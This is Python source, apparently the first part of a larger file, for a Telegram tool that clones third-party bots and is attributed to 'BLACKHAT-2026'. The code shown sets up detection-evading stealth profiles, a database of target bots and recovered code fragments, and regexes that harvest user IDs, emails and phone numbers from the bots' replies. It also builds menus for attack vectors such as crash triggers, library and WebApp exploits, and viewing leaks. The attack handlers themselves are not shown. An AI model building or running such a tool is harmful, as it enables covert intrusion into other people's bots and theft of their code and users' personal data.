#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TELEGRAM BOT CLONE PROXY v3.0 - ULTIMATE BEHAVIORAL MIRROR
Author: BLACKHAT-2026
Compatibility: aiogram 3.9.0+
Stealth Level: MAXIMUM

LEGAL DISCLAIMER: This tool is for EDUCATIONAL PURPOSES and AUTHORIZED TESTING ONLY.
Unauthorized use against third-party bots is ILLEGAL and violates multiple laws.
"""

# ============================================================================
# ALL IMPORTS - COMPLETE AND FIXED
# ============================================================================

import asyncio
import json
import sqlite3
import re
import hashlib
import random
import time
import logging
import difflib
import os
import sys
import threading
import uuid
import string
import signal
import zipfile
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Union, Set
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from contextlib import asynccontextmanager
from io import BytesIO

# Third-party imports
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
    ForceReply, Chat, User, ChatMemberUpdated, ChatJoinRequest,
    InlineQuery, ChosenInlineResult, Poll, PollAnswer,
    ShippingQuery, PreCheckoutQuery, FSInputFile, BufferedInputFile
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.utils.chat_action import ChatActionSender
from aiogram.exceptions import (
    TelegramBadRequest, TelegramForbiddenError, TelegramRetryAfter,
    TelegramUnauthorizedError, TelegramNetworkError
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

VERSION = "3.1.0-ELITE-FIXED"
CONFIG_DIR = Path("clone_data")
CONFIG_DIR.mkdir(exist_ok=True)
DB_PATH = CONFIG_DIR / "clone_db.sqlite"
SESSIONS_DIR = CONFIG_DIR / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)
EXPORTS_DIR = CONFIG_DIR / "exports"
EXPORTS_DIR.mkdir(exist_ok=True)
LOGS_DIR = CONFIG_DIR / "logs"
LOGS_DIR.mkdir(exist_ok=True)
MEDIA_CACHE_DIR = CONFIG_DIR / "media_cache"
MEDIA_CACHE_DIR.mkdir(exist_ok=True)

# Advanced logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOGS_DIR / f'bot_clone_{datetime.now().strftime("%Y%m%d")}.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Stealth configuration
STEALTH_LEVELS = {
    "paranoid": {
        "typing_variance": (0.5, 2.5),
        "delay_multiplier": (0.8, 1.2),
        "burst_probability": 0.1,
        "human_error_prob": 0.02,
        "session_rotation": True,
        "max_actions_per_min": 25,
        "cooldown_between_bots": 5.0,
        "jitter_range": (0.1, 0.5)
    },
    "balanced": {
        "typing_variance": (0.3, 1.5),
        "delay_multiplier": (0.9, 1.1),
        "burst_probability": 0.2,
        "human_error_prob": 0.01,
        "session_rotation": True,
        "max_actions_per_min": 35,
        "cooldown_between_bots": 3.0,
        "jitter_range": (0.05, 0.3)
    },
    "aggressive": {
        "typing_variance": (0.1, 0.8),
        "delay_multiplier": (0.95, 1.05),
        "burst_probability": 0.3,
        "human_error_prob": 0.005,
        "session_rotation": False,
        "max_actions_per_min": 50,
        "cooldown_between_bots": 1.0,
        "jitter_range": (0.01, 0.1)
    }
}

# Rate limiting defaults
DEFAULT_RATE_LIMIT = 30
MAX_MESSAGE_LENGTH = 4096

# ============================================================================
# DATABASE MANAGER - FIXED THREADING IMPORT
# ============================================================================

class DatabaseManager:
    """Enhanced thread-safe database operations with connection pooling"""
    
    _instance = None
    _connection_pool = {}
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialize()
        return cls._instance
    
    def _initialize(self):
        """Initialize database and create tables"""
        self._create_tables()
    
    def _get_connection(self):
        """Get or create database connection"""
        thread_id = threading.get_ident()  # FIXED: was threading.get_id()
        if thread_id not in self._connection_pool:
            conn = sqlite3.connect(DB_PATH, timeout=30)
            conn.row_factory = sqlite3.Row
            conn.execute("PRAGMA foreign_keys = ON")
            conn.execute("PRAGMA journal_mode = WAL")
            conn.execute("PRAGMA synchronous = NORMAL")
            conn.execute("PRAGMA cache_size = 10000")
            conn.execute("PRAGMA temp_store = MEMORY")
            self._connection_pool[thread_id] = conn
        return self._connection_pool[thread_id]
    
    def _create_tables(self):
        """Create all database tables if they don't exist"""
        try:
            conn = self._get_connection()
            c = conn.cursor()
            
            # Target bots table
            c.execute('''
                CREATE TABLE IF NOT EXISTS target_bots (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE NOT NULL,
                    added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    description TEXT,
                    first_seen TIMESTAMP,
                    last_active TIMESTAMP,
                    total_interactions INTEGER DEFAULT 0,
                    success_rate REAL DEFAULT 0,
                    avg_response_time REAL DEFAULT 0,
                    metadata TEXT
                )
            ''')
            
            # Sessions table
            c.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_uuid TEXT UNIQUE NOT NULL,
                    user_id INTEGER NOT NULL,
                    target_bot_id INTEGER NOT NULL,
                    stealth_level TEXT DEFAULT 'balanced',
                    start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    end_time TIMESTAMP,
                    interactions INTEGER DEFAULT 0,
                    status TEXT DEFAULT 'active',
                    metadata TEXT,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Interactions table
            c.execute('''
                CREATE TABLE IF NOT EXISTS interactions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id INTEGER,
                    target_bot_id INTEGER NOT NULL,
                    direction TEXT CHECK(direction IN ('user_to_target', 'target_to_user')),
                    message_type TEXT,
                    content_hash TEXT,
                    response_time_ms INTEGER,
                    raw_data TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (session_id) REFERENCES sessions(id),
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Button flows table
            c.execute('''
                CREATE TABLE IF NOT EXISTS button_flows (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_bot_id INTEGER NOT NULL,
                    from_state TEXT,
                    button_text TEXT,
                    button_callback_data TEXT,
                    to_state TEXT,
                    response_type TEXT,
                    response_hash TEXT,
                    frequency INTEGER DEFAULT 1,
                    last_seen TIMESTAMP,
                    confidence REAL DEFAULT 0.5,
                    metadata TEXT,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id),
                    UNIQUE(target_bot_id, from_state, button_callback_data, to_state)
                )
            ''')
            
            # Patterns table
            c.execute('''
                CREATE TABLE IF NOT EXISTS patterns (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_bot_id INTEGER NOT NULL,
                    pattern_type TEXT,
                    regex TEXT,
                    sample_value TEXT,
                    confidence REAL,
                    detected_at TIMESTAMP,
                    occurrences INTEGER DEFAULT 1,
                    metadata TEXT,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Timing patterns table
            c.execute('''
                CREATE TABLE IF NOT EXISTS timing_patterns (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_bot_id INTEGER NOT NULL,
                    from_state TEXT,
                    to_state TEXT,
                    avg_delay REAL,
                    std_dev REAL,
                    min_delay REAL,
                    max_delay REAL,
                    sample_count INTEGER,
                    last_updated TIMESTAMP,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Media cache table
            c.execute('''
                CREATE TABLE IF NOT EXISTS media_cache (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    file_hash TEXT UNIQUE,
                    file_id TEXT,
                    file_type TEXT,
                    file_size INTEGER,
                    local_path TEXT,
                    first_seen TIMESTAMP,
                    last_used TIMESTAMP,
                    use_count INTEGER DEFAULT 1,
                    metadata TEXT
                )
            ''')
            
            # Code fragments table
            c.execute('''
                CREATE TABLE IF NOT EXISTS code_fragments (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_bot_id INTEGER NOT NULL,
                    fragment_type TEXT,
                    content TEXT,
                    line_number INTEGER,
                    file_path TEXT,
                    confidence REAL,
                    source_vector TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    is_reconstructed BOOLEAN DEFAULT 0,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Conversation states table
            c.execute('''
                CREATE TABLE IF NOT EXISTS conversation_states (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_bot_id INTEGER NOT NULL,
                    state_name TEXT NOT NULL,
                    state_type TEXT,
                    parent_state TEXT,
                    entry_count INTEGER DEFAULT 0,
                    first_seen TIMESTAMP,
                    last_seen TIMESTAMP,
                    message_pattern TEXT,
                    metadata TEXT,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Create indexes for performance
            c.execute("CREATE INDEX IF NOT EXISTS idx_interactions_target ON interactions(target_bot_id)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_interactions_timestamp ON interactions(timestamp)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_button_flows_target ON button_flows(target_bot_id)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_patterns_target ON patterns(target_bot_id)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_code_fragments_target ON code_fragments(target_bot_id)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_sessions_user ON sessions(user_id)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_sessions_status ON sessions(status)")
            
            conn.commit()
            logger.info("Database tables created/verified successfully")
            
        except Exception as e:
            logger.error(f"Error creating tables: {e}", exc_info=True)
            raise
    
    def execute(self, query: str, params: tuple = ()) -> sqlite3.Cursor:
        """Execute a query and return cursor"""
        conn = self._get_connection()
        try:
            return conn.execute(query, params)
        except sqlite3.Error as e:
            logger.error(f"Database error: {e}")
            raise
    
    def executemany(self, query: str, params: list) -> sqlite3.Cursor:
        """Execute many queries"""
        conn = self._get_connection()
        try:
            return conn.executemany(query, params)
        except sqlite3.Error as e:
            logger.error(f"Database error: {e}")
            raise
    
    def commit(self):
        """Commit current transaction"""
        conn = self._get_connection()
        conn.commit()
    
    def close_all(self):
        """Close all database connections"""
        for thread_id, conn in self._connection_pool.items():
            try:
                conn.close()
            except:
                pass
        self._connection_pool.clear()
    
    def add_target_bot(self, username: str, metadata: Dict = None) -> int:
        """Add a new target bot to database"""
        try:
            cursor = self.execute(
                "INSERT OR IGNORE INTO target_bots (username, metadata, first_seen) VALUES (?, ?, ?)",
                (username, json.dumps(metadata or {}), datetime.now().isoformat())
            )
            self.commit()
            
            # Get or create ID
            cursor = self.execute("SELECT id FROM target_bots WHERE username = ?", (username,))
            result = cursor.fetchone()
            return result[0] if result else None
        except Exception as e:
            logger.error(f"Error adding target bot: {e}")
            return None
    
    def get_target_bots(self, limit: int = 100) -> List[Dict]:
        """Get all target bots"""
        try:
            cursor = self.execute(
                """SELECT id, username, added_date, total_interactions, success_rate, last_active 
                   FROM target_bots ORDER BY last_active DESC NULLS LAST LIMIT ?""",
                (limit,)
            )
            return [dict(row) for row in cursor.fetchall()]
        except Exception as e:
            logger.error(f"Error getting target bots: {e}")
            return []
    
    def get_target_bot(self, bot_id: int) -> Optional[Dict]:
        """Get specific target bot by ID"""
        try:
            cursor = self.execute(
                "SELECT * FROM target_bots WHERE id = ?",
                (bot_id,)
            )
            row = cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Error getting target bot: {e}")
            return None
    
    def update_bot_stats(self, bot_id: int, response_time_ms: int, success: bool = True):
        """Update bot statistics"""
        try:
            self.execute(
                """UPDATE target_bots 
                   SET total_interactions = total_interactions + 1,
                       last_active = ?,
                       avg_response_time = (avg_response_time * total_interactions + ?) / (total_interactions + 1),
                       success_rate = (success_rate * total_interactions + ?) / (total_interactions + 1)
                   WHERE id = ?""",
                (datetime.now().isoformat(), response_time_ms, 1 if success else 0, bot_id)
            )
            self.commit()
        except Exception as e:
            logger.error(f"Error updating bot stats: {e}")
    
    def create_session(self, user_id: int, target_bot_id: int, stealth_level: str = "balanced") -> str:
        """Create a new clone session"""
        try:
            session_uuid = str(uuid.uuid4())
            self.execute(
                """INSERT INTO sessions (session_uuid, user_id, target_bot_id, stealth_level, start_time, status)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (session_uuid, user_id, target_bot_id, stealth_level, datetime.now().isoformat(), "active")
            )
            self.commit()
            return session_uuid
        except Exception as e:
            logger.error(f"Error creating session: {e}")
            return None
    
    def end_session(self, session_uuid: str):
        """End a clone session"""
        try:
            self.execute(
                "UPDATE sessions SET end_time = ?, status = 'ended' WHERE session_uuid = ?",
                (datetime.now().isoformat(), session_uuid)
            )
            self.commit()
        except Exception as e:
            logger.error(f"Error ending session: {e}")
    
    def add_interaction(self, interaction: Dict) -> int:
        """Store an interaction"""
        try:
            content_hash = hashlib.sha256(
                json.dumps(interaction.get("raw_data", ""), sort_keys=True).encode()
            ).hexdigest()
            
            cursor = self.execute(
                """INSERT INTO interactions 
                   (session_id, target_bot_id, direction, message_type, content_hash, response_time_ms, raw_data)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (
                    interaction.get("session_id"),
                    interaction.get("target_bot_id"),
                    interaction.get("direction"),
                    interaction.get("message_type", "unknown"),
                    content_hash,
                    interaction.get("response_time_ms"),
                    json.dumps(interaction.get("raw_data", {}))
                )
            )
            self.commit()
            return cursor.lastrowid
        except Exception as e:
            logger.error(f"Error adding interaction: {e}")
            return None
    
    def add_button_flow(self, flow_data: Dict):
        """Record button flow pattern"""
        try:
            self.execute(
                """INSERT INTO button_flows 
                   (target_bot_id, from_state, button_text, button_callback_data, 
                    to_state, response_type, response_hash, last_seen, confidence)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                   ON CONFLICT(target_bot_id, from_state, button_callback_data, to_state) 
                   DO UPDATE SET frequency = frequency + 1, last_seen = ?""",
                (
                    flow_data["target_bot_id"],
                    flow_data.get("from_state", "unknown"),
                    flow_data.get("button_text", "unknown"),
                    flow_data["button_callback_data"],
                    flow_data.get("to_state", "unknown"),
                    flow_data.get("response_type", "text"),
                    flow_data.get("response_hash", ""),
                    datetime.now().isoformat(),
                    flow_data.get("confidence", 0.5),
                    datetime.now().isoformat()
                )
            )
            self.commit()
        except Exception as e:
            logger.error(f"Error adding button flow: {e}")
    
    def add_timing_pattern(self, target_bot_id: int, from_state: str, to_state: str, delay: float):
        """Record timing pattern between states"""
        try:
            cursor = self.execute(
                """SELECT avg_delay, std_dev, min_delay, max_delay, sample_count 
                   FROM timing_patterns 
                   WHERE target_bot_id = ? AND from_state = ? AND to_state = ?""",
                (target_bot_id, from_state, to_state)
            )
            existing = cursor.fetchone()
            
            if existing:
                avg_delay, std_dev, min_delay, max_delay, sample_count = existing
                new_count = sample_count + 1
                new_avg = avg_delay + (delay - avg_delay) / new_count
                
                # Update standard deviation
                if sample_count > 1:
                    new_std = (((std_dev**2 * (sample_count - 1)) + 
                               (delay - avg_delay) * (delay - new_avg)) / new_count) ** 0.5
                else:
                    new_std = abs(delay - new_avg)
                
                new_min = min(min_delay, delay)
                new_max = max(max_delay, delay)
                
                self.execute(
                    """UPDATE timing_patterns 
                       SET avg_delay = ?, std_dev = ?, min_delay = ?, max_delay = ?, 
                           sample_count = ?, last_updated = ?
                       WHERE target_bot_id = ? AND from_state = ? AND to_state = ?""",
                    (new_avg, new_std, new_min, new_max, new_count, datetime.now().isoformat(),
                     target_bot_id, from_state, to_state)
                )
            else:
                self.execute(
                    """INSERT INTO timing_patterns 
                       (target_bot_id, from_state, to_state, avg_delay, std_dev, 
                        min_delay, max_delay, sample_count, last_updated)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (target_bot_id, from_state, to_state, delay, 0, delay, delay, 1, datetime.now().isoformat())
                )
            self.commit()
        except Exception as e:
            logger.error(f"Error adding timing pattern: {e}")
    
    def add_code_fragment(self, target_bot_id: int, fragment_type: str, content: str, 
                          file_path: Optional[str] = None, line_number: Optional[int] = None,
                          confidence: float = 0.5, source_vector: str = ""):
        """Store recovered code fragment"""
        try:
            self.execute(
                """INSERT INTO code_fragments 
                   (target_bot_id, fragment_type, content, file_path, line_number, confidence, source_vector)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (target_bot_id, fragment_type, content[:1000], file_path, line_number, confidence, source_vector)
            )
            self.commit()
            logger.info(f"Code fragment stored: {fragment_type} (conf: {confidence})")
        except Exception as e:
            logger.error(f"Error storing code fragment: {e}")
    
    def detect_patterns(self, target_bot_id: int, text: str) -> Dict:
        """Analyze text for patterns and store them"""
        patterns = {}
        
        try:
            # User ID / username pattern
            username_pattern = r'@(\w{5,32})'
            usernames = re.findall(username_pattern, text)
            if usernames:
                patterns['username'] = usernames[0]
                self._store_pattern(target_bot_id, 'username', username_pattern, usernames[0], 0.9)
            
            # User ID (numeric)
            userid_pattern = r'id[:\s]*(\d{5,})|user[:\s]*(\d{5,})|(\d{7,})'
            userids = re.findall(userid_pattern, text, re.IGNORECASE)
            if userids:
                matched_id = next((x for group in userids for x in group if x), None)
                if matched_id:
                    patterns['user_id'] = matched_id
                    self._store_pattern(target_bot_id, 'user_id', userid_pattern, matched_id, 0.85)
            
            # Price pattern
            price_pattern = r'[\$\€\£\¥](\d+(?:[.,]\d{2})?)|\b(\d+(?:[.,]\d{2})?)\s*(?:USD|EUR|GBP|JPY|RUB|CNY)\b'
            prices = re.findall(price_pattern, text, re.IGNORECASE)
            if prices:
                patterns['price'] = True
                self._store_pattern(target_bot_id, 'price', price_pattern, str(prices[0]), 0.8)
            
            # Order/Reference number pattern
            order_pattern = r'#?([A-Z0-9]{4,}[-]?[A-Z0-9]{2,})|order[:\s]*#?(\d+)|ref[:\s]*#?([A-Z0-9]+)'
            orders = re.findall(order_pattern, text, re.IGNORECASE)
            if orders:
                patterns['order_number'] = True
                self._store_pattern(target_bot_id, 'order_number', order_pattern, 'REF123', 0.7)
            
            # Date pattern
            date_pattern = r'\d{1,4}[/\-\.]\d{1,2}[/\-\.]\d{1,4}'
            dates = re.findall(date_pattern, text)
            if dates:
                patterns['date'] = dates[0]
                self._store_pattern(target_bot_id, 'date', date_pattern, dates[0], 0.95)
            
            # Time pattern
            time_pattern = r'\d{1,2}:\d{2}(?::\d{2})?\s*(?:AM|PM|am|pm)?'
            times = re.findall(time_pattern, text)
            if times:
                patterns['time'] = times[0]
                self._store_pattern(target_bot_id, 'time', time_pattern, times[0], 0.9)
            
            # Email pattern
            email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            emails = re.findall(email_pattern, text)
            if emails:
                patterns['email'] = emails[0]
                self._store_pattern(target_bot_id, 'email', email_pattern, emails[0], 0.95)
            
            # Phone number pattern (international format)
            phone_pattern = r'\+\d{1,3}[\s-]?\d{1,4}[\s-]?\d{1,4}[\s-]?\d{1,9}'
            phones = re.findall(phone_pattern, text)
            if phones:
                patterns['phone'] = phones[0]
                self._store_pattern(target_bot_id, 'phone', phone_pattern, phones[0], 0.85)
                
        except Exception as e:
            logger.error(f"Error detecting patterns: {e}")
        
        return patterns
    
    def _store_pattern(self, target_bot_id: int, pattern_type: str, regex: str, sample: str, confidence: float):
        """Store detected pattern in database"""
        try:
            self.execute(
                """INSERT INTO patterns 
                   (target_bot_id, pattern_type, regex, sample_value, confidence, detected_at, occurrences)
                   VALUES (?, ?, ?, ?, ?, ?, ?)
                   ON CONFLICT DO NOTHING""",
                (target_bot_id, pattern_type, regex, sample[:100], confidence, 
                 datetime.now().isoformat(), 1)
            )
            self.commit()
        except Exception as e:
            logger.error(f"Error storing pattern: {e}")
    
    def get_bot_statistics(self, bot_id: int) -> Dict:
        """Get comprehensive statistics for a bot"""
        stats = {}
        
        try:
            # Basic stats
            cursor = self.execute(
                "SELECT * FROM target_bots WHERE id = ?",
                (bot_id,)
            )
            row = cursor.fetchone()
            stats['bot_info'] = dict(row) if row else {}
            
            # Interaction counts
            cursor = self.execute(
                """SELECT message_type, COUNT(*) as count 
                   FROM interactions WHERE target_bot_id = ? GROUP BY message_type""",
                (bot_id,)
            )
            stats['message_types'] = {row['message_type']: row['count'] for row in cursor.fetchall()}
            
            # Button flow stats
            cursor = self.execute(
                """SELECT COUNT(DISTINCT from_state) as states, COUNT(*) as total_flows,
                          MAX(frequency) as max_frequency
                   FROM button_flows WHERE target_bot_id = ?""",
                (bot_id,)
            )
            stats['flow_stats'] = dict(cursor.fetchone() or {})
            
            # Pattern stats
            cursor = self.execute(
                "SELECT pattern_type, COUNT(*) as count FROM patterns WHERE target_bot_id = ? GROUP BY pattern_type",
                (bot_id,)
            )
            stats['pattern_stats'] = {row['pattern_type']: row['count'] for row in cursor.fetchall()}
            
            # Timing stats
            cursor = self.execute(
                "SELECT AVG(avg_delay) as avg_response FROM timing_patterns WHERE target_bot_id = ?",
                (bot_id,)
            )
            row = cursor.fetchone()
            stats['avg_response'] = row['avg_response'] if row else 0
            
            # Code fragments
            cursor = self.execute(
                "SELECT COUNT(*) as fragments FROM code_fragments WHERE target_bot_id = ?",
                (bot_id,)
            )
            row = cursor.fetchone()
            stats['code_fragments'] = row['fragments'] if row else 0
            
        except Exception as e:
            logger.error(f"Error getting bot statistics: {e}")
        
        return stats

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class InteractionRecord:
    """Record of a single interaction (user message + bot response)"""
    id: Optional[int] = None
    session_id: Optional[int] = None
    target_bot_id: Optional[int] = None
    user_message_id: Optional[int] = None
    user_message_text: Optional[str] = None
    user_message_raw: Optional[Dict] = None
    bot_response_id: Optional[int] = None
    bot_response_text: Optional[str] = None
    bot_response_raw: Optional[Dict] = None
    button_sequence: List[Dict] = field(default_factory=list)
    timestamp: datetime = field(default_factory=datetime.now)
    response_time_ms: Optional[int] = None
    metadata: Dict = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for serialization"""
        result = asdict(self)
        result['timestamp'] = self.timestamp.isoformat()
        return result

@dataclass
class BotState:
    """Detected bot state/menu"""
    name: str
    description: str
    buttons: List[Dict] = field(default_factory=list)
    parent_state: Optional[str] = None
    child_states: List[str] = field(default_factory=list)
    message_patterns: List[str] = field(default_factory=list)
    entry_points: List[str] = field(default_factory=list)
    variable_placeholders: List[str] = field(default_factory=list)
    confidence: float = 0.5
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    visit_count: int = 1

@dataclass
class MediaCacheEntry:
    """Media cache entry"""
    file_hash: str
    file_id: str
    file_type: str
    file_size: int
    local_path: Optional[Path] = None
    first_seen: datetime = field(default_factory=datetime.now)
    last_used: datetime = field(default_factory=datetime.now)
    use_count: int = 1

# ============================================================================
# BOT SETUP
# ============================================================================

class CloneStates(StatesGroup):
    """FSM states for the cloning bot itself"""
    main_menu = State()
    adding_target = State()
    selecting_target = State()
    cloning_session = State()
    viewing_stats = State()
    exporting_data = State()
    settings_menu = State()
    attack_vector_selection = State()
    monitoring_attack = State()
    viewing_leaks = State()
    confirming_action = State()

# Initialize bot components
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router(name="main_router")
db = DatabaseManager()

# Global state
active_sessions: Dict[int, Dict] = {}
user_stealth_engines: Dict[int, 'StealthEngine'] = {}
user_settings: Dict[int, Dict] = defaultdict(lambda: {"stealth_level": "balanced"})

# ============================================================================
# UI COMPONENTS
# ============================================================================

class UIComponents:
    """Enhanced beautiful inline keyboard builders"""
    
    @staticmethod
    def main_menu() -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="🎯 Add Target Bot", callback_data="menu_add_target"),
            InlineKeyboardButton(text="📋 List Bots", callback_data="menu_list_bots")
        )
        builder.row(
            InlineKeyboardButton(text="▶️ Start Clone Session", callback_data="menu_start_clone"),
            InlineKeyboardButton(text="📊 Statistics", callback_data="menu_stats")
        )
        builder.row(
            InlineKeyboardButton(text="⚙️ Settings", callback_data="menu_settings"),
            InlineKeyboardButton(text="📤 Export Data", callback_data="menu_export")
        )
        builder.row(
            InlineKeyboardButton(text="🔥 Attack Vectors", callback_data="menu_attack_vectors"),
            InlineKeyboardButton(text="👁️ View Leaks", callback_data="menu_view_leaks")
        )
        builder.row(
            InlineKeyboardButton(text="ℹ️ Help", callback_data="menu_help"),
            InlineKeyboardButton(text="🔄 Reset", callback_data="menu_reset")
        )
        return builder.as_markup()
    
    @staticmethod
    def attack_vector_menu() -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="🐍 Python Traceback", callback_data="attack_traceback"),
            InlineKeyboardButton(text="📚 Library Exploits", callback_data="attack_library")
        )
        builder.row(
            InlineKeyboardButton(text="🔍 Probe Commands", callback_data="attack_probe"),
            InlineKeyboardButton(text="💥 Crash Triggers", callback_data="attack_crash")
        )
        builder.row(
            InlineKeyboardButton(text="🌐 WebApp Exploits", callback_data="attack_webapp"),
            InlineKeyboardButton(text="🔄 Run ALL", callback_data="attack_all")
        )
        builder.row(
            InlineKeyboardButton(text="⬅️ Back", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def settings_menu(current_level: str = "balanced") -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        
        levels = ["paranoid", "balanced", "aggressive"]
        for level in levels:
            text = f"{'🛡️' if level == 'paranoid' else '⚖️' if level == 'balanced' else '⚡'} {level.title()}"
            if level == current_level:
                text = f"✅ {text}"
            builder.row(InlineKeyboardButton(text=text, callback_data=f"stealth_{level}"))
        
        builder.row(
            InlineKeyboardButton(text="🔄 Multi-Session", callback_data="settings_multisession"),
            InlineKeyboardButton(text="📊 Active Sessions", callback_data="view_sessions")
        )
        builder.row(
            InlineKeyboardButton(text="🗑️ Clear Cache", callback_data="settings_clear_cache"),
            InlineKeyboardButton(text="📈 Reset Stats", callback_data="settings_reset_stats")
        )
        builder.row(
            InlineKeyboardButton(text="⬅️ Back", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def export_menu() -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="📄 JSON Export", callback_data="export_json"),
            InlineKeyboardButton(text="🌳 Flow Diagram", callback_data="export_diagram")
        )
        builder.row(
            InlineKeyboardButton(text="🐍 Python Stubs", callback_data="export_stubs"),
            InlineKeyboardButton(text="📊 Full Report", callback_data="export_report")
        )
        builder.row(
            InlineKeyboardButton(text="📦 Export All", callback_data="export_all"),
            InlineKeyboardButton(text="📁 List Exports", callback_data="export_list")
        )
        builder.row(
            InlineKeyboardButton(text="⬅️ Back", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def bot_list(bots: List[Dict], page: int = 0) -> InlineKeyboardMarkup:
        """Generate dynamic bot list with pagination"""
        builder = InlineKeyboardBuilder()
        items_per_page = 8
        start = page * items_per_page
        end = start + items_per_page
        page_bots = bots[start:end]
        
        for bot in page_bots:
            status = "🟢" if bot.get('last_active') else "⚪"
            text = f"{status} @{bot['username']} ({bot['total_interactions']} msgs)"
            builder.row(InlineKeyboardButton(text=text, callback_data=f"select_bot_{bot['id']}"))
        
        # Pagination controls
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton(text="◀️ Prev", callback_data=f"bots_page_{page-1}"))
        if end < len(bots):
            nav_buttons.append(InlineKeyboardButton(text="Next ▶️", callback_data=f"bots_page_{page+1}"))
        
        if nav_buttons:
            builder.row(*nav_buttons)
        
        builder.row(InlineKeyboardButton(text="🏠 Main Menu", callback_data="menu_main"))
        
        return builder.as_markup()
    
    @staticmethod
    def bot_action_menu(bot_id: int, username: str) -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="▶️ Clone Session", callback_data=f"clone_{bot_id}"),
            InlineKeyboardButton(text="🔥 Attack", callback_data=f"attack_{bot_id}")
        )
        builder.row(
            InlineKeyboardButton(text="📊 Stats", callback_data=f"stats_{bot_id}"),
            InlineKeyboardButton(text="📤 Export", callback_data=f"export_bot_{bot_id}")
        )
        builder.row(
            InlineKeyboardButton(text="🔙 Back", callback_data="menu_list_bots"),
            InlineKeyboardButton(text="🏠 Main", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def confirm_warning() -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="⚠️ I UNDERSTAND AND ACCEPT", callback_data="ack_legal_warning")
        )
        builder.row(
            InlineKeyboardButton(text="❌ EXIT", callback_data="menu_exit")
        )
        return builder.as_markup()
    
    @staticmethod
    def clone_session_controls(target_bot: str, session_id: str) -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="⏸️ Pause", callback_data=f"pause_{session_id}"),
            InlineKeyboardButton(text="⏹️ Stop", callback_data=f"stop_{session_id}")
        )
        builder.row(
